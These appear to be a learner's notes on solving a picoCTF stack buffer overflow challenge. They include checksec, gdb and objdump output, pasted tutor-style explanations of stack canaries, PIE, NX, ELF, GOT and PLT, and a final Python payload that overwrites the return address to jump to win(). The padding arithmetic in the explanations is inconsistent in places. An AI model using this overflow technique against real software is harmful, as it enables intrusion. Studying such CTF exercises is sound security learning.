# 
- file, checksec
- nm vuln | grep win
- objdump -d vuln | grep "<win>:"
- gdb
    - print win
    - info address win

cat answers.txt - | nc lonely-island.picoctf.net 62015
Note: The - after answers.txt is important—it tells cat to switch to your keyboard input after it finishes printing the file.

64-bit
dynamic
not stripped
0x15
0x90
yes
fgets
win
buffer overflow
0x7b
NX
ROP
0x401176


## The Complete "Pwn" Master Summary

| Component | Technical Role | Analogy | The "Aha!" Discovery |
| :--- | :--- | :--- | :--- |
| **ELF Metadata** | Found `win()` at `0x401176`. | The map to the treasure. | Used `nm` or `gdb` because the binary was **Not Stripped**. |
| **No Canary** | No check for stack integrity. | The door was left unlocked. | `checksec` confirmed no "cookie" was protecting the return address. |
| **Padding (40B)** | Overwrote Buffer + Saved RBP. | The length of the hallway to the door. | **The Observation:** `rbp` showed `0x4444444343434343`. This meant 37 bytes (A+B+C) filled the buffer, but leaked 3 bytes of 'D' into the RBP. We added 3 more to "flush" the RBP perfectly. |
| **RET Gadget** | Shifted stack by 8 bytes. | The "spacer" to align the floor. | Found using `objdump`. It prevents the 64-bit alignment crash. |
| **MOVAPS** | Requirement for 16-byte alignment. | The height requirement for the ride. | Diagnosed when the exploit jumped to `win` but crashed inside `libc`. |
| **Little-Endian** | Sent `\x76\x11\x40...` | Writing in the CPU's native language. | Used Python's `sys.stdout.buffer.write` to ensure null bytes (`\x00`) weren't stripped by the shell. |

# gdb GNU Debugger


# ROP (Return Oriented Programming)
NX (No-Ececute) enable : This means the Stack is marked as data-only. You cannot put your own shellcode (malicious instructions) into that char buffer[0x15] and try to run it. If the CPU tries to execute code on the stack, the program will crash.

Impact: You likely can't do a "ret2shellcode" attack. You'll probably need to use ROP (Return Oriented Programming) or jump to a function that already exists in the code (like a "win" function).

# checksec
This `checksec` output is like a "treasure map" for an exploiter. It tells you exactly which doors are locked and which ones are wide open. Since you are in a picoCTF environment, this is the most critical information you can have.

Let’s break down what these results mean for your `vuln` binary:

---

## 1. The "Open Doors" (Vulnerabilities)

### **Stack: No canary found** 🔓
This is the most important result for your current challenge. Remember our discussion about the "bird in the coal mine"? 
* There is **no secret value** protecting the return address. 
* Because you found a buffer of **0x15** bytes and an input limit of **0x90**, you can overwrite the return address without the program noticing or crashing immediately. This is a classic "buffer overflow" scenario.

### **PIE: No PIE (0x400000)** 📍
**PIE** stands for Position Independent Executable.
* **No PIE** means the program's code is loaded at the **exact same memory address** every time you run it (starting at `0x400000`).
* This makes your life much easier because you don't have to "guess" where functions like `main()` or a hidden `win()` function are located. Their addresses are fixed.

---

## 2. The "Locked Doors" (Mitigations)

### **NX: NX enabled** 🛡️
**NX** stands for **No-Execute**. 
* This means the **Stack** is marked as data-only. You cannot put your own shellcode (malicious instructions) into that `char buffer[0x15]` and try to run it. If the CPU tries to execute code on the stack, the program will crash.
* **Impact:** You likely can't do a "ret2shellcode" attack. You'll probably need to use **ROP (Return Oriented Programming)** or jump to a function that already exists in the code (like a "win" function).



### **RELRO: Partial RELRO** 🏗️
**RELRO** (Relocation Read-Only) protects the **GOT (Global Offset Table)** we talked about earlier.
* **Partial** means the internal ELF sections are reordered to protect them, but the GOT is still potentially writable. However, for a beginner picoCTF, you usually don't need to worry about this yet.

---

## 3. The Analysis Advantage

### **Stripped: No** ✅
As we discussed, this means the **Symbol Table** is intact!
* When you open this in a debugger (like `gdb`), you will see the actual names of the functions. 
* You can simply type `info functions` in GDB to see if there is a "secret" function that prints the flag.

---

# Canary, PIE (Position Independent Executable)


No PIE means the program's code is loaded at the exact same memory address every time you run it (starting at 0x400000).

This makes your life much easier because you don't have to "guess" where functions like main() or a hidden win() function are located. Their addresses are fixed.

---

This is a great definition. The term **"Canary"** is a direct nod to the "canary in a coal mine"—a bird miners used to detect toxic gases. If the bird died, the miners knew the environment was unsafe and they needed to get out.

In C/C++ programming, a **Stack Canary** (or Stack Guard) serves the exact same purpose for your program's memory.


## 1. The Anatomy of the Guard
When a function is called, the compiler (if canary protection is enabled) places a small, secret piece of data on the **stack**, right between the local variables and the **Return Address**.

* **Local Variables:** Where your arrays and integers live.
* **The Canary:** The secret value (usually a random 4 or 8-byte integer).
* **The Return Address:** The pointer that tells the CPU where to go once the function finishes.

---

## 2. How it Defeats Buffer Overflows
A classic **Buffer Overflow** attack happens when a program writes more data to a buffer (like a `char` array) than it can hold. The goal of the attacker is usually to overwrite the **Return Address** with a new address pointing to malicious code.

**Without a Canary:**
1.  Attacker overflows the buffer.
2.  The Return Address is overwritten.
3.  The function finishes, jumps to the attacker's address, and the system is compromised.

**With a Canary:**
1.  Attacker overflows the buffer.
2.  To reach the Return Address, the attacker **must** write over the Canary first.
3.  Before the function returns, the CPU checks: *"Is the Canary still the same secret value I put there earlier?"*
4.  **The Detection:** Because the attacker didn't know the secret value, the Canary is now "dead" (corrupted).
5.  **The Reaction:** The program immediately terminates with a "Stack Smashing Detected" error, preventing the jump to the malicious address.

# Header Table, GOT, PLT
To understand how these four components interact, we have to look at the ELF file from two different perspectives: how it looks **on disk** (Sections) and how it looks **in memory** (Segments).

The **Section Header Table** and **Program Header Table** are the "blueprints" for the file, while the **GOT** and **PLT** are the specialized "gears" that handle dynamic linking.

---

## 1. The High-Level Relationship
The relationship can be visualized as a hierarchy of organization and execution:

* **The Section Header Table** describes the file for the **Linker** (during compilation).
* **The Program Header Table** describes the file for the **Loader** (during execution).
* **The PLT and GOT** live inside specific sections/segments to handle the jumping between your code and external libraries.



---

## 2. Linking vs. Execution (The Tables)

### **Section Header Table (The Linker's View)**
This table lists every individual section in the file (like `.text`, `.data`, `.plt`, `.got`). It is used by the compiler and static linker to organize code and data. It tells the system: *"Here is where the code is, here is where the global variables are, and here is the metadata for debugging."*

### **Program Header Table (The Loader's View)**
When you run the program, the Linux kernel doesn't care about "sections"; it cares about "segments." The Program Header Table tells the OS how to map the file into memory. 
* It groups multiple sections into single segments (e.g., the `.text`, `.plt`, and `.rodata` sections are often grouped into a single **Loadable Segment** marked as Read-Only + Executable).

---

## 3. The "Lazy" Connection (PLT and GOT)
The **PLT** and **GOT** work together to solve a specific problem: your program doesn't know the memory address of a library function (like `printf`) until the program is actually running.

| Component | Location | Role |
| :--- | :--- | :--- |
| **PLT (Procedure Linkage Table)** | Code Segment (`.text`) | A "jump-pad." It contains tiny stubs of code that redirect your function calls to the right place. |
| **GOT (Global Offset Table)** | Data Segment (`.data`) | A "phonebook." It holds the actual memory addresses of external functions once they are discovered. |

### **How they interact at Runtime:**
1.  **The Call:** Your code calls a function, but it actually jumps to an entry in the **PLT**.
2.  **The Lookup:** The **PLT** code looks at a specific slot in the **GOT**. 
3.  **The Resolution:** * The first time the function is called, the GOT slot points back to a "resolver" (part of the dynamic linker) which finds the library in memory.
    * The linker writes the real address into the **GOT**.
4.  **The Shortcut:** Every subsequent call jumps to the **PLT**, which sees the real address in the **GOT** and sends the CPU straight to the library.

---

## 4. Summary of the Flow
1.  The **Section Header Table** defines where the `.plt` and `.got` sections are located in the file.
2.  The **Program Header Table** tells the OS to load the `.plt` as executable code and the `.got` as writable data.
3.  The **PLT** provides the instructions to trigger the search for external code.
4.  The **GOT** stores the final result of that search so the program doesn't have to look it up again.

This "Lazy Binding" (resolving addresses only when needed) significantly speeds up program startup times, as the system doesn't have to find every single library function before the program even begins.

Would you like to see a step-by-step trace of what happens to the CPU registers during a PLT/GOT jump?

# ELF (Executable and Linkable Format)
When compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is  created. 


## 1. The Role of ELF in the Compilation Pipeline
The ELF format is used at multiple stages of the transformation from source code to a running process:

* **Relocatable Files (`.o`):** Created after the compilation/assembly phase. These contain machine code but aren't ready to run yet because they have "missing addresses" for functions in other files.
* **Shared Objects (`.so`):** These are libraries (like `libc`) that can be loaded at runtime.
* **Executable Files:** The final product (e.g., `a.out`) that the Linux kernel knows how to load into memory and execute.



### **The ELF Header**
This is the "ID card" of the file. It resides at the very beginning and provides essential metadata:
* **Magic Number:** Identifies the file as an ELF (the first four bytes are `0x7F`, `E`, `L`, `F`).
* **Architecture:** Whether it’s 32-bit or 64-bit.
* **Endianness:** Big-endian or Little-endian.
* **Entry Point:** The memory address where the program starts (where `main` eventually begins).

### **Sections (The Content)**
The file is split into "sections" that group similar types of data together:
* **`.text`:** The actual machine code (CPU instructions). This is usually read-only.
* **`.data`:** Initialized global and static variables.
* **`.rodata`:** Read-only data, like hardcoded strings (e.g., `"Hello, World!"`).
* **`.bss`:** Uninitialized global variables. This section doesn't take up space on disk; it just tells the OS to allocate a certain amount of zeroed-out memory at startup.

### **The Tables (The Maps)**
* **Program Header Table:** Essential for **executables**. It tells the Linux kernel how to create a process image by mapping file segments into memory.
* **Section Header Table:** Essential for **linking**. It describes the sections listed above so the linker can combine multiple `.o` files correctly.

---

## 3. Why is this format important?
Before ELF became the standard (in the early 90s), Linux used a format called `a.out`. ELF replaced it because it is far more flexible:

1.  **Dynamic Linking:** ELF makes it easy for a program to say, "I don't have the code for `printf` here; go find it in the system's C library when I start up."
2.  **Security:** Because the file defines clear boundaries (like `.text` vs `.data`), the OS can mark the code section as **Read-Only** and **Executable**, while marking the data section as **No-Execute (NX)**. This prevents many types of hacker exploits.
3.  **Portability:** While the machine code inside is specific to a CPU (like x86_64), the *structure* of the ELF container is the same across different hardware architectures using Linux.


# Dynamic Linking


# Bouns: buffer overflow
- buffer: 21, input: 144

## 1. The "Distance" Problem
In your code, `char buffer[0x15]` is 21 bytes. But the **Return Address** is usually located about 32 to 40 bytes away from the start of that buffer.


To "reach" the return address, your payload needs to look like this:
1.  **Junk Data:** ~32 to 40 bytes of 'A's (to fill the buffer and the space after it).
2.  **The Address:** The 8 bytes of the `win()` function address (`0x401176`).

---

## 2. How to find the exact "Junk" count
Since you have GDB open, let's find that exact distance. Run this command inside GDB:

```bash
(gdb) run <<< $(python3 -c "print('A'*21 + 'BBBBBBBB' + 'CCCCCCCC' + 'DDDDDDDD')")
```

After it crashes, look at the **registers**:
* Type `info registers`
* Look at **`rbp`**: If it is `0x4242424242424242` (BBBBBBBB), you are 8 bytes away.
* Look at **`rip`**: If it is `0x4343434343434343` (CCCCCCCC), you found the sweet spot!

---

## 3. The "Little-Endian" Flip
Computer memory (ELF on x86_64) reads addresses **backwards**. You cannot type `0x401176` into the terminal. You have to send the raw bytes in reverse order.

In Python, your final payload would look something like this:
```python
# Assuming the offset is 32 bytes of junk
padding = b"A" * 32 
win_addr = b"\x76\x11\x40\x00\x00\x00\x00\x00"
payload = padding + win_addr
```

---

Bingo! You just successfully triggered a **Segmentation Fault**, and the output you got is pure gold for a reverse engineer. 

Look at that memory address where it crashed: `0x00000a4444444444`. 

### 1. Decoding the Crash
In hex, `0x44` is the ASCII character **'D'**.
* Your input had `DDDDDDDD` at the end.
* The `0a` at the beginning is the **Newline character** (`\n`) added by the `print` function.
* The CPU tried to "return" to the address `DDDD...`, couldn't find any code there, and panicked (SIGSEGV).


### 2. Finding the "Sweet Spot"
Let's look at your input structure again:
* `A` * 21 (The buffer)
* `BBBBBBBB` (8 bytes)
* `CCCCCCCC` (8 bytes)
* `DDDDDDDD` (8 bytes) <-- **This is where the Return Address lives!**

Wait—if it crashed on the **Ds**, that means the **Cs** were sitting exactly where the **Saved Base Pointer (RBP)** usually lives.

### 3. Let's Verify the Offset
To be 100% sure, run this command in GDB right now:
```bash
(gdb) info registers
```
Check the value of **`rbp`**. 
* If `rbp` is `0x4343434343434343` (all 'C's), then your padding is exactly **29 bytes** ($21 \text{ 'A's} + 8 \text{ 'B's} = 29$).
* The next 8 bytes (where the 'D's were) is the **Return Address**.

### 4. The Final Payload Construction
Since you know the `win()` address is `0x401176`, and the Return Address starts after 32 bytes (21 'A's + 8 'B's + 3 'C's maybe? Let's simplify), we need to be precise.

If `DDDD...` was the return address, your padding is **21 + 8 + 8 = 37 bytes**. 

**The Plan:**
1. Send **37 bytes** of "junk" (like 'A's).
2. Send the **address of `win()`** in Little-Endian format.

**Try this in GDB to see if it works:**
```bash
(gdb) run <<< $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'\x76\x11\x40\x00\x00\x00\x00\x00')")
```
*(I adjusted the padding to 32 because 64-bit stacks are usually 16-byte aligned. If 32 doesn't work, try 40!)*

**Did the program output "cat: flag.txt: No such file or directory" or jump to the win function?**

(gdb) info registers
rbp            0x4444444343434343  0x4444444343434343


---

Congratulations! You just successfully executed a **Buffer Overflow** to achieve **Remote Code Execution (RCE)**. Seeing that `picoCTF{...}` flag pop up in your terminal is the ultimate "Mission Accomplished" moment in binary exploitation.

---

### 1. What just happened?
Even though the program ended with a `Segmentation fault`, it doesn't matter. The sequence of events was perfect:
1.  **The Overwrite:** Your 40 bytes of 'A's filled the buffer and the saved RBP.
2.  **The Hijack:** The CPU reached the end of `vuln()`, looked at the Return Address, and saw `0x401176` (your `win` function).
3.  **The Payload:** The CPU jumped to `win()`, which executed `system("cat flag.txt")`. 
4.  **The Flag:** The `vfork` message in GDB shows the program successfully started a "child process" (the `cat` command) to print your flag.



### 2. Why the final Crash?
The `0x0000000000000000 in ?? ()` at the very end happened because once `win()` finished printing the flag, it tried to return to *its* caller. Since we didn't set up a valid return address for `win()`, it tried to jump to address `0x0`, which doesn't exist. In a CTF, we call this a "clean exploit" because the goal (the flag) was achieved before the crash occurred.

---

##
It is definitely not "too easy." In fact, calculating the exact offset is the part of binary exploitation where most people get stuck. It’s the difference between a "crash" (failed exploit) and a "shell" (success).


## 2. Why the math became "40"
To understand why we added 3 bytes to get to 40, we have to look at the "Stack Frame" boundaries:

1.  **The Buffer Zone:** Your 21 'A's.
2.  **The Alignment Gap:** The "extra" space the compiler added.
3.  **The Saved RBP (8 bytes):** This is the "Base Pointer" tray.
4.  **The Return Address (8 bytes):** This is the "Instruction Pointer" tray.

### The Logic of the Leak:
* You sent **37 bytes** total before the **D**s started (`21 + 8 + 8`).
* Your `rbp` showed that **five** `C`s made it in, but **three** `D`s also "leaked" into the `rbp` tray.
* If `D` is leaking into the `rbp` tray, it means your input hasn't reached the **Return Address** yet.
* Since the `rbp` tray is **8 bytes wide**, and your `rbp` value was `44 44 44 43 43 43 43 43`, you needed 3 more bytes of "junk" to perfectly fill that `rbp` tray.

**Calculation:**
* Initial junk: `37 bytes`
* Missing junk to fill RBP: `3 bytes`
* **Total Padding needed:** **`40 bytes`**
---

## The Complete "Pwn" Master Summary

| Component | Technical Role | Analogy | The "Aha!" Discovery |
| :--- | :--- | :--- | :--- |
| **ELF Metadata** | Found `win()` at `0x401176`. | The map to the treasure. | Used `nm` or `gdb` because the binary was **Not Stripped**. |
| **No Canary** | No check for stack integrity. | The door was left unlocked. | `checksec` confirmed no "cookie" was protecting the return address. |
| **Padding (40B)** | Overwrote Buffer + Saved RBP. | The length of the hallway to the door. | **The Observation:** `rbp` showed `0x4444444343434343`. This meant 37 bytes (A+B+C) filled the buffer, but leaked 3 bytes of 'D' into the RBP. We added 3 more to "flush" the RBP perfectly. |
| **RET Gadget** | Shifted stack by 8 bytes. | The "spacer" to align the floor. | Found using `objdump`. It prevents the 64-bit alignment crash. |
| **MOVAPS** | Requirement for 16-byte alignment. | The height requirement for the ride. | Diagnosed when the exploit jumped to `win` but crashed inside `libc`. |
| **Little-Endian** | Sent `\x76\x11\x40...` | Writing in the CPU's native language. | Used Python's `sys.stdout.buffer.write` to ensure null bytes (`\x00`) weren't stripped by the shell. |

```shell
objdump -d vuln | grep ret
  40101a:       c3                      ret 
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x1a\x10\x40\x00\x00\x00\x00\x00' + b'\x76\x11\x40\x00\x00\x00\x0
0\x00')" > payload.bin
gdb vuln
run < payload.bin
```